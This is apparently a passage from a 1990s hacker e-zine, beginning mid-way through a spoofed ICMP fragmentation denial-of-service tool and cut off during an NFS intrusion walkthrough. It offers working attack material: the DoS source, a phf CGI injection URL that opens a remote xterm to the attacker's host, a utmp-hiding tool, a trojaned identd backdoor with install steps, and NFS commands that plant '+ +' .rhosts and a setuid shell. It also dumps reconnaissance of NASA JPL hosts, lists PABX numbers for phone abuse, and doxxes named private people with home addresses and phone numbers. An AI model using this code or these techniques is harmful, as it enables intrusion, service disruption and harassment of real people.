 * exactly what this does to '95. As of now I haven't tested it on NT,
 * but maybe I will later ;).  All of this source wasn't originally
 * written by me I just took one of the old programs to kill POSIX and
 * SVR based systems and worked on it a bit, then made it spoof =). 
 * VallaH  (yaway@hotmail.com)
 *
 *  Update: It appears to work on some older versions of mac os
 */

/* Yah this is for linux, but i like the BSD ip header better then linux's */
#define __BSD_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>

int main(int argc, char **argv)
{
        int s,i;
        char buf[400];
        struct ip *ip = (struct ip *)buf;
        struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
        struct hostent *hp, *hp2;
        struct sockaddr_in dst;
        int offset;
        int on = 1;
	int num = 5;

        bzero(buf, sizeof buf);

        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {
                perror("socket");
                exit(1);
        }
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
                perror("IP_HDRINCL");
                exit(1);
        }
        if (argc < 3) {
		printf("Jolt v1.0 Yet ANOTHER windows95(And macOS!) glitch by VallaH (yaway@hotmail.com)\n");
                printf("\nusage: %s <dstaddr> <saddr> [number]\n",argv[0]);
		printf("\tdstaddr is the host your attacking\n");
		printf("\tsaddr is the host your spoofing from\n");
		printf("\tNumber is the number of packets to send, 5 is the default\n");
		printf("\nNOTE:  This is based on a bug that used to affect POSIX complient, and SYSV \n\t systems so its nothing new..\n");
		printf("\nGreets to Bill Gates! How do ya like this one? :-)\n");
                exit(1);
        }
        if (argc == 4) num = atoi(argv[3]);
    for (i=1;i<=num;i++) {

        if ((hp = gethostbyname(argv[1])) == NULL) {
                if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
                        fprintf(stderr, "%s: unknown host\n", argv[1]);
			exit(1);
                }
        } else {
                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
        }

        if ((hp2 = gethostbyname(argv[2])) == NULL) {
                if ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {
                        fprintf(stderr, "%s: unknown host\n", argv[2]);
                        exit(1);
                }
        } else {
                bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
        }

        printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
        ip->ip_v = 4;
        ip->ip_hl = sizeof *ip >> 2;
        ip->ip_tos = 0;
        ip->ip_len = htons(sizeof buf);
        ip->ip_id = htons(4321);
        ip->ip_off = htons(0);
        ip->ip_ttl = 255;
        ip->ip_p = 1;
        ip->ip_csum = 0;                 /* kernel fills in */

        dst.sin_addr = ip->ip_dst;
        dst.sin_family = AF_INET;

        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->checksum = htons(~(ICMP_ECHO << 8));
        for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
                ip->ip_off = htons(offset >> 3);
                if (offset < 65120)
                        ip->ip_off |= htons(0x2000);
                else
                        ip->ip_len = htons(418);  /* make total 65538 */
                if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
                                        sizeof dst) < 0) {
                        fprintf(stderr, "offset %d: ", offset);
                        perror("sendto");
                }
                if (offset == 0) {
                        icmp->type = 0;
                        icmp->code = 0;
                        icmp->checksum = 0;
                }
        }
    }
	return 0;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Phf shell spawning tekneek : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

http://www.blah.com/cgi-bin/phf?Qalias=x%0a/usr/openwin/xterm%20-display%20your.addy.com

Which incase you cant work it out will open an xterm on your Xwindows capable box, in effect
giving you shell access as the uid the http daemon is running as (usually 'nobody')
NOTE: the vulnerable system must also have the Xwindows system installed. 

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Hide.c : unknown
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/* hide.c , it does what it says on the can */

#include <stdio.h>
#include <stdlib.h>
#include <utmp.h>
#include <pwd.h>

#define UTMPFILE        "/etc/utmp"

        FILE    *utmpfile;
        char    *utmp_tmp[10240];

main (argc, argv)
        int     argc;
        char    *argv[];
{

        struct  utmp    *user_slot;
        struct  passwd  *pwd;
        char    line[10], name[10], host[20];
        int     index;

        printf ("Welcome to HIDE !        FORMAT:  hide [-i]\n\n");
        utmpfile = fopen (UTMPFILE, "r+");
        if (utmpfile == NULL)
        {
                printf ("ERROR while opening utmp file... exiting...\n");
                exit ();
        }
        index = ttyslot();                                              /* Get this users utmp index */
        index *= sizeof(struct utmp);   /* 36 */
        fseek(utmpfile, index, 0);
/****  Get real UID  ****/
        pwd = getpwuid (getuid());
        if (pwd == NULL)
                printf ("Who the hell are you???");
        else
        {
        printf ("Real user identity:\n");
        printf ("NAME  %s\n", pwd->pw_name);
        printf (" UID  %d\n", pwd->pw_uid);
        printf (" GID  %d\n\n", pwd->pw_gid);
        }
/****  If ARG1 = "-i" then disappear from utmp  ****/
        if ( (argc>1) && (!strcmp(argv[1], "-i")) )
        {
        index+=8;       /* Rel PNT name */
        fseek(utmpfile, index, 0);
        fwrite ("\000", 8, 1, utmpfile);        /* NO NAME */
        fwrite ("\000", 8, 1, utmpfile);        /* NO HOST */
        fclose(utmpfile);
        printf ("Removed from utmp\n");
        exit();
        }
/****  Change utmp data  ****/
        printf ("Enter new data or return for default:\n");
        fseek(utmpfile, index, 0);      /* Reset file PNT */
        fread(line, 8, 1, utmpfile);    line[8]=NULL;
        fread(name, 8, 1, utmpfile);    name[8]=NULL;
        fread(host, 16, 1, utmpfile);   host[16]=NULL;
        fseek(utmpfile, index, 0);      /* Reset file PNT */
        dinput (" TTY  [%s]%s", line, 8);
        dinput ("NAME  [%s]%s", name, 8);
        dinput ("HOST  [%s]%s", host, 16);
        fclose(utmpfile);
}

/* Data input */
dinput (prompt, string, size)
        char    *prompt;
        char    *string;
        int     size;
{
        char    input[80];
        char    *stat;
        char    space[] = "                              ";

        space[20-strlen(string)] = '\000';
        printf (prompt, string, space);
        stat = gets (input);
        if (strlen(input) > 0)
                fwrite (input, size, 1, utmpfile);
        else
                fseek (utmpfile, size, 1);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 6. Tridentd.c : BiT
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/* This is just a simple hack to identd's code so that identd will allow
 * you to connect to its port and send a special command to make identd 
 * spawn off a shell.
 * 
 * When connected to the identd port of the machine running the trojaned
 * identd enter the command:
 *
 * "SS ####### ##"
 *
 *  where ####### is your defined MKEY and ## is your defined SKEY
 * 
 * NOTE: You must have root on the system you wish to install this backdoor
 * on. And the binary must be owned by root and in the wheel or root groups.
 *
 * To compile/install:
 *
 *    gcc -Wall -O3 -w -O identd.c -o in.identd
 *    strip in.identd
 *    mv in.identd /usr/sbin/in.identd
 *    chown root.root /usr/sbin/in.identd
 *    chmod 770 /usr/sbin/in.identd
 *
 *    Then edit /etc/services and /etc/inetd.conf so that it spawns the
 *    correct daemon.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/time.h>
#include <ctype.h>
#include <string.h>

#define MKEY 3849572
#define SKEY 72

int writeranduser(void)
{
        int r;
        char username[12];
        srandom(getpid());
        memset(username, 0, 12);
        r = random() % 26;
        r = r + 'a';
        memset(username, r, 11);
        if(write(1, username, strlen(username)) < strlen(username))
                exit(0);
        return 1;
}

int main(int argc, char **argv)
{
        char genrandomuser = 1;
        char *portpair = NULL;
        fd_set rset;
        struct timeval tv;
        int i;

        if(argc > 1) genrandomuser = 0;
        portpair = malloc(1024);
        if(!portpair)
                exit(0);
        memset(portpair, 0, 1024);
        tv.tv_sec = 180;
        tv.tv_usec = 0;
        FD_ZERO(&rset);
        FD_SET(0, &rset);
        i = select(1, &rset, NULL, NULL, &tv);
        if(i < 1)
                exit(0);
        if(read(0, portpair, 512) < 1)
                exit(0);
        while(*portpair)
        {
                if(isdigit(*portpair))
                        if(write(1, portpair, 1) < 0)
                                exit(0);
                        else;
                else if(*portpair == ',')
                        if(write(1, portpair, 1) < 0)
                                exit(0);
                        else;
                portpair++;
        }
        if(write(1, " : USERID : UNIX : ", 19) < 19)
                exit(0);
        if(!genrandomuser)
                if(write(1, argv[1], strlen(argv[1])) < strlen(argv[1]))
                        exit(0);
                else;
        else
                writeranduser();
        if(write(1, "\r\n", 2) < 2)
                exit(0);
        return 1;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Norweigen PABX list : RipperJack
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Alrek Studenthjem                            - 55291802
Arbeidskontoret i Arna                       - 55243890
Arbeidskontoret i Fyllingsdalen              - 55168910
Arbeidskontoret p Nesttun                   - 55135330
Arbeidskontoret p Osyro                    - 56304695
Bergen Airport Hotel                         - 55229236
Bergen Tekniske Fagskole                     - 55232582
Betanien Hospitalet                          - 55166979 - fax!
Datainstrument A/S                           - 55314390 - etter stengetid??
Den Norske Bank                              - 56302071
Inter Revisjon Bergen                        - 55295201
Jebsens Management A/S                       - 55310606
Knappentunet                                 - 55124299
Norsk Blikkvalseverk A/S                     - 55341260
Olaviken Behandlingssenter                   - 56149798
Os Likningskontor og Folkeregister           - 56301299
*Statens Dykkerskole                         - 55268904
Statens Hgskole for kunsthndverk og design - 55311943
Steen-Hansen F Malings- og Lakkfabrikk A/S   - 55100040
Stolz Rthing AS                             - 55345560
Vestlandet Kompetansesenter                  - 55296485
Bjrketeigen                                 - 56555710
Norheimsund Yrkesskule                       - 56551530
Toloheimen                                   - 56552030
Arbeidskontoret i Knarvik                    - 56352330
Odda Plast AS                                - 53644480
Solid Vedlikehold AS                         - 56334275

To find out just how much it costs you to call these pbxs, dial 80031031 for
Telenor's price information service.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Windows trick : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  An elite w1nd0ze trick for w1nd0ze 3.1 icon 0wnersh1p...

  The Windows 3.1 trick.
  ======================

I found this out myself at work the other day, I was trying to fuck with the
File -> Run in program manager, so I was giving it like random acsii's in the
command line and shit, then I decided to throw a load of spaces at it, and
I found this fucked with the icons and refresh on the display, so here's the
technique to make all the icons dissapear!

1) Get into Program Manager, then go File -> Run.
2) In the program name box, just put ALOT of spaces, leave your finger on the
   space bar until the box is full, now delete the last 4 or 5 of your spaces
   and put a full stop in, then fill the rest of the box up with spaces.
3) Now try run the "                                         .   " program by
   clicking on the OK button.
4) It will give an error box with a character like "`" in it, this shows it has
   worked, because usually it gives like "cannot run blah blah blah..."
5) Now click on the OK in the error box to get rid of it.
6) Now open any program group, and maximise it, all the icons will dissapear,
   next minimise and maximise another group, and so on, until all the icons
   have dissapeared in all the groups.

Thats it, the only way to turn your w1nd0ze system back to normal is to exit :P

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. sIn inf0z : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                    Fucking sIn b1tchez bow to the elite.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Alias      :  Evil Chick
 Real Name  :  Suzette Kimminau
 Address    :  130 105th Ave. S.E. Apt. 218
               Bellevue, Wa 98004
               USA

 Telephone  :  (206)454-7176
 E-mail     :  evilchic@NWLINK.COM

-------------------------------------------------------------------------------

 Alias      :  \\StOrM\\
 Real Name  :  Jason Sloderbeck
 Address    :  5739 N Norton,
               Kansas City, MO 64119
               USA

 Telephone  :  (816)453-8722
 E-mail     :  storm@SINNERZ.COM

-------------------------------------------------------------------------------

 Alias      :  JDKane
 Real Name  :  Kim
 Address    :  327 E Park Road,
               Round Lake, IL 60073
               USA

 Telephone  :  (847)546-9154
 E-mail     :  

-------------------------------------------------------------------------------

 Alias      :  Soul Tear
 Real Name  :  Wesley Stroeber
 Address    :  10770 E. Silver Vein Dr.
               Tucson, Arizona 85710
               USA

 Telephone  :
 E-mail     :  soultear@mindspring.com

-------------------------------------------------------------------------------

 Alias      : Scud-O
 Real Name  : Kevin Shivers
 Address    : PO Box 448
              Sykesville, Maryland 21784
              USA

 Telephone  : (410)442-2410
 E-mail     : foxmulder@WORLDNET.ATT.NET

 * Scud-O is leaving sIn.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

      You want to know how lame sIn really are? check www.sinnerz.com

             The Hax0r brothers don't 0wn a car between them.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. DCC trick : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

d1s in #hackers showed us this the other day, its quite simple, and probably
old, all you have to do is link a file, like warez.tgz to zero, then DCC it
to someone thats 1) away, or 2) very stupid, it will then keep sending them
shit until they 1) stop it, or 2) have no more disk space :)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Mars systems @*.jpl.nasa.gov : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Fear mad dnscan skills, even shows OS... wE c4N dR1VE tH3 r0VER!@#~

jpl.nasa.gov    mars-elvis                     A     137.78.16.108
jpl.nasa.gov    mars-elvis                     HINFO PowerMac7100-80  System7.5.3
jpl.nasa.gov    mars-lanrover                  A     137.78.78.131
jpl.nasa.gov    mars-lanrover                  HINFO ShivaLanRover-E  ShivaProprietary
jpl.nasa.gov    mars-lanrover-1                A     137.78.78.132
jpl.nasa.gov    mars-lanrover-1                HINFO ShivaLanRover-E  ShivaProprietary
jpl.nasa.gov    mars-lanrover-2                A     137.78.78.133
jpl.nasa.gov    mars-lanrover-2                HINFO ShivaLanRover-E  ShivaProprietary
jpl.nasa.gov    mars-lanrover-3                A     137.78.78.134
jpl.nasa.gov    mars-lanrover-3                HINFO ShivaLanRover-E  ShivaProprietary
jpl.nasa.gov    mars-lanrover-4                A     137.78.78.135
jpl.nasa.gov    mars-lanrover-4                HINFO ShivaLanRover-E  ShivaProprietary
jpl.nasa.gov    mars-test-1                    A     137.78.78.191
jpl.nasa.gov    mars-test-1                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-2                    A     137.78.78.192
jpl.nasa.gov    mars-test-2                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-3                    A     137.78.78.193
jpl.nasa.gov    mars-test-3                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-4                    A     137.78.78.194
jpl.nasa.gov    mars-test-4                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-5                    A     137.78.78.195
jpl.nasa.gov    mars-test-5                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-6                    A     137.78.78.196
jpl.nasa.gov    mars-test-6                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-7                    A     137.78.78.197
jpl.nasa.gov    mars-test-7                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-8                    A     137.78.78.198
jpl.nasa.gov    mars-test-8                    HINFO PCMAC       Various
jpl.nasa.gov    mars-test-9                    A     137.78.78.199
jpl.nasa.gov    mars-test-9                    HINFO PCMAC       Various
jpl.nasa.gov    mars98ftp                      A     137.78.82.27
jpl.nasa.gov    mars98ftp                      HINFO MacII       system7
jpl.nasa.gov    marsala                        A     137.78.24.26
jpl.nasa.gov    marsala                        HINFO PC          Windows95
jpl.nasa.gov    marseyes                       A     137.78.54.45
jpl.nasa.gov    marseyes                       HINFO PCLaptop    window95
jpl.nasa.gov    marsglow                       A     137.78.144.167
jpl.nasa.gov    marsglow                       HINFO HP1600CM    PCL
jpl.nasa.gov    marsmir                        A     137.78.6.221
jpl.nasa.gov    marsmir                        HINFO SPARC2      Solaris2.5
jpl.nasa.gov    marsnight                      A     137.78.144.165
jpl.nasa.gov    marsnight                      HINFO HP4M        PCL
jpl.nasa.gov    marsnt1                        A     137.78.78.31
jpl.nasa.gov    marsnt1                        HINFO CompaqProliant  NT4.0Server
jpl.nasa.gov    marsnt2                        A     137.78.78.32
jpl.nasa.gov    marsnt2                        HINFO CompaqProliant  NT4.0Server
jpl.nasa.gov    marsnt3                        A     137.78.78.106
jpl.nasa.gov    marsnt3                        HINFO CompaqPC    NTServer3.5.1
jpl.nasa.gov    marsnt3-alias1                 A     137.78.78.107
jpl.nasa.gov    marsnt3-alias1                 HINFO CompaqProliant  NTServer3.51
jpl.nasa.gov    marssup-premia                 A     137.78.78.60
jpl.nasa.gov    marssup-premia                 HINFO ASTPREMIALX  WIN95
jpl.nasa.gov    marsweb1                       A     137.78.78.120
jpl.nasa.gov    marsweb1                       HINFO SunUltra170  Solaris
jpl.nasa.gov    marsweb2                       A     137.78.78.121
jpl.nasa.gov    marsweb2                       HINFO ClonePC     WinNT4.0
jpl.nasa.gov    marsweb3                       A     137.78.78.122
jpl.nasa.gov    marsweb3                       HINFO MicronPPro200  NT4.0Server

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. The issues list : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
-------------------------------------------------------------------------------
  1997 :
-------------------------------------------------------------------------------

  issue 2 : Mon 26th May
  issue 3 : Tue 15th July      
  issue 4 : Wed 3rd September
  issue 5 : Thu 23rd October
  issue 6 : Fri 12th December

-------------------------------------------------------------------------------
  1998 :
-------------------------------------------------------------------------------

  issue 7 : Sat 31st January
  issue 8 : Sun 22nd March
  issue 9 : Mon 11th May
  issue 10: Tue 30th June
  issue 11: Wed 19th August
  issue 12: Thu 8th October
  issue 13: Fri 27th November

-------------------------------------------------------------------------------
  1999 :
-------------------------------------------------------------------------------

  issue 14: Sat 16th January
  issue 15: Sun 7th March
  issue 16: Mon 26th April
  issue 17: Tue 15th June
  issue 18: Wed 4th August
  issue 19: Thu 23rd September

  issue 20: Sat 1st January 2000!@!@"$@%!"~@

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. Damned warez pups : so1o 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 (I didn't touch anything on this document, this is how I got it - so1o)

---

 U call us kriminals.  We distribute copyrighted software... and u call us
criminals.  We steal games from radio shack... and u call us criminals.
We
 exist without skin color, (cuz we're always inside downloading and
uploading) without religious bias, (cuz we have know idea that the hell 
religios bias is) without intelligence... and u kall us criminals.  U
start wars and stuff, yet we're the kriminals.
Yes, I am a criminal.  My crime is that of stupidity.  My crime is that of
judging people by how much they upload and how k-rad they're typing
 is, not what they look like or if they can spell they're name right the
first time
 without messing up.  My crime is that of stealing u're work and putting
my name On it, and u  get all huffy puffy about it.
I am a kourier, and this is my manifesto.  U may stop one moron, but U
can't stop us all!  After all, we're all alike.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. Simple NFS technique : Synner
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

-:Introduction:-

The Network File System as it is commonly called NFS ,allows you to share
filesystems among hosts.NFS was firstly introduced by Sun Microsystems back
in 1985.The good thing about NFS is that when a server crashes ,no data is
lost, simply the clients wait untill it brings itself back to normal and
then continue as if nothing had happened.

-:Exporting filesystems:-

A server is said to 'export' filesystems when it makes filesystems avaiable
for use by other machines.An NFS client must always mount a filesystem
before using it.Then the server examines the mount request and authenticates
the client before allowing access.

-:The Mount Daemon:-

Mount requests are handled by the mountd.Mountd reads /etc/exports so it can
get information about what filesystems should be exported and how to
outsiders.The export file consists of directories in the left
column,followed by a series of attributes and options stating how the
filesystem can be exported.
For example ,/etc/exports:

/disk2/data2    -access:foovax:godzilla,root=godzilla
/disk1/data1    -access:acid25:stonefree:ganja

permits /disk2/data2 to be mounted by foovax and godzilla whilst giving
godzilla root privilidge in this filesystem when mounted.
In addition /disk1/data1 can be mounted by acid25,stonefree and ganja.

Attribute       Description
----------------------------------------------------------------------------
-access:list    Lists hosts that can mount the filesystem.
-ro             Export read-only;no clients may write on the filesystem.
-rw:list        Export read-only mostly;list describes the hosts allowed
		to write on the mounted filesystem.All other must read-only
-root:list      Lists hosts permitted to access the filesystem as root
		without this option a client has equilevant access as 
		nobody. (usually UID -2).
-anon:n         Specifies UID that should be used for requests coming
		from an uknown user.Defaults to nobody.
----------------------------------------------------------------------------


-:Mounting Remote Filesystems:-

On machines that support NFS the mount command has been modified to
understand the hostname:directory notation

For example if a user can mount /CDROM from foobar he must give:

% mount 666.666.666.666:/CDROM /mnt
% cd /mnt

Then he would mount the /CDROM directory from jerky to his machine /mnt
directory.When finished he would do 'umount /mnt' to unmount it.
When invoked with no parameters ,mount will show which filesystems
are mounted in the machine along with their type etc.
The mount command allows one to create temporarly network mounts,but
mounts that are part of the permanent configuration must be stated in
/etc/fstab thus automatically mounted in boot time.


-:Showmount:-

Showmount querries the mount daemon of the remote host to obtain the 
server's NFS state.Invoked with no parameters ,showmount lists the clients
that are mounting from that host.
Common options:

-a or -all          List both client hostname and mounted directory in 
		    host:dir format.
-d or -directories  List only the directories mounted by some client

-e or -exports      List the NFS server export list.

see also showmount(1).

-:NFS exploitation:-

This last section will cover some simple mechanisms that can exploit
NFS when its not configured properly.Dont expect black magic here.


% showmount -e target.com
Export list for target.com:

/CDROM          (everyone)
/home           (everyone)
/usr            sex,drugs,jesuz-krist

%

We see here that target.com allows the /CDROM & /home filesystems exported
to the world!.Now we will attempt to mount /home and place an .rhosts entry
to a user (/CDROM is no good :) ).

# mount 123.123.123.123:/home /mnt
# cd /mnt
# ls -l
1 drwxr-xr-x 11 root   daemon   512 Jun 12 09:47 .
1 drwxr-xr-x  7 root   wheel    512 Jun 12 11:32 ..
1 drwxr-xr-x  9 6667   daemon  1024 Jun 12 23:12 guest
1 drwxr-xr-x  5 203     10     1024 Jun 12 09:12 foosucker
# echo "guest:*:6667:1:disposable hero:/tmp:/bin/sh" >>/etc/passwd
# su guest
$ echo "+ +" >~guest/.rhosts
$ cd;umount /mnt
$ rlogin target.com -l guest
	Welcome to Target Inc. !
target%

Lets review this step-by-step.At first we discover that home directories
at target.com are exported to the world.Then we proceed in mounting them
at the /mnt directory.Then we access the directory and see that a guest
user exists.We write down his uid/gid and create a temporarly user at
our own passwd file.We then su to guest and create an .rhosts entry
allowing us to rlogin freely to Target!.

Considering that target.com has '/home' exported to everyone and since
root cannot modify files on a NFS filesystem,its only a matter of creating
a 'bin' owned suid shell in guest's home directory allowing us bin access.

# mount 123.123.123.123:/home /mnt
# cd /mnt/guest
# su guest
$ chmod 777 .
$ exit
# su bin
$ rcp /bin/sh ./binsh
$ chmod 4755 ./binsh
$ exit
# rlogin 123.123.123.123 -l guest
	Welcome to Target Inc.!
target% ./binsh
$ whoami
bin

Although there are many more issues regarding NFS ,as Sun's AMD and
automount (these are enhanced versions of 'mount') or more sophisticated
